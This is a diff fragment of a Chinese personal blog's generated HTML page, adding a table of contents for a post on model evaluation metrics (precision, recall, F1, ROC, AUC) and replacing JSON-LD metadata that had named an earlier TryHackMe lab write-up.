+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87"><span class="toc-text">常见的评估指标</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TP%EF%BC%8CTN%EF%BC%8CFP%EF%BC%8CFN%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">TP，TN，FP，FN的理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%B8%8F%E2%83%A3-%E5%87%86%E7%A1%AE%E7%8E%87-Accuracy"><span class="toc-text">1️⃣ 准确率 (Accuracy)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%B8%8F%E2%83%A3-%E7%B2%BE%E7%A1%AE%E7%8E%87-Precision"><span class="toc-text">2️⃣ 精确率 (Precision)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%B8%8F%E2%83%A3-%E5%8F%AC%E5%9B%9E%E7%8E%87-Recall"><span class="toc-text">3️⃣ 召回率 (Recall)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%B8%8F%E2%83%A3-F1%E5%88%86%E6%95%B0-F1-Score"><span class="toc-text">4️⃣ F1分数 (F1-Score)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%B8%8F%E2%83%A3-ROC%E6%9B%B2%E7%BA%BF-ROC-Curve"><span class="toc-text">5️⃣ ROC曲线 (ROC Curve)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%EF%B8%8F%E2%83%A3-AUC%E5%80%BC-Area-Under-the-Curve"><span class="toc-text">6️⃣ AUC值 (Area Under the Curve)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%87%8D%E7%82%B9%E5%85%B3%E6%B3%A8%E4%BB%80%E4%B9%88%E6%8C%87%E6%A0%87%EF%BC%9F%EF%BC%88%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%89"><span class="toc-text">什么时候重点关注什么指标？（应用场景）</span></a></li></ol>
     </div>
   </section>
 
@@ -3513,7 +3541,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","sameAs":["https://github.com/volantis-x"],"description":"个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://qingwan.top/","name":"清风菀月轩"}},{"@type":"ListItem","position":2,"item":{"@id":"https://qingwan.top/categories/渗透/","name":"渗透"}},{"@type":"ListItem","position":3,"item":{"@id":"https://qingwan.top/2024/02/25/THM-reset靶场wp/","name":"TryHackMe-reset渗透靶场wp"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清风菀月轩","url":"https://qingwan.top/","description":"个人博客","author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","description":"个人博客"},"publisher":{"@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://qingwan.top?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"TryHackMe-reset渗透靶场wp","description":"TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题","inLanguage":["zh-CN","en","zh-HK","zh-TW","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://qingwan.top/2024/02/25/THM-reset%E9%9D%B6%E5%9C%BAwp/"},"author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/"},"publisher":{"@type":"Organization","name":"清风菀月轩","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://qingwan.top/2024/02/25/THM-reset%E9%9D%B6%E5%9C%BAwp/","wordCount":33,"datePublished":"2024-02-25T09:17:18.172Z","dateModified":"2024-02-25T09:49:14.876Z","articleSection":"渗透","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","sameAs":["https://github.com/volantis-x"],"description":"个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://qingwan.top/","name":"清风菀月轩"}},{"@type":"ListItem","position":2,"item":{"@id":"https://qingwan.top/categories/大模型/","name":"大模型"}},{"@type":"ListItem","position":3,"item":{"@id":"https://qingwan.top/2024/10/23/大模型常见指标的定义和运用/","name":"大模型常见评估指标及其运用"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清风菀月轩","url":"https://qingwan.top/","description":"个人博客","author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","description":"个人博客"},"publisher":{"@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://qingwan.top?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"大模型常见评估指标及其运用","description":"常见评估大模型的指标以及其运用场景举例（通俗易懂版！）","inLanguage":["zh-CN","en","zh-HK","zh-TW","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://qingwan.top/2024/10/23/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%B8%B8%E8%A7%81%E6%8C%87%E6%A0%87%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%BF%90%E7%94%A8/"},"author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/"},"publisher":{"@type":"Organization","name":"清风菀月轩","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://qingwan.top/2024/10/23/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%B8%B8%E8%A7%81%E6%8C%87%E6%A0%87%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%BF%90%E7%94%A8/","wordCount":27,"datePublished":"2024-10-23T15:12:32.665Z","dateModified":"2024-10-29T14:13:34.353Z","articleSection":"大模型","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
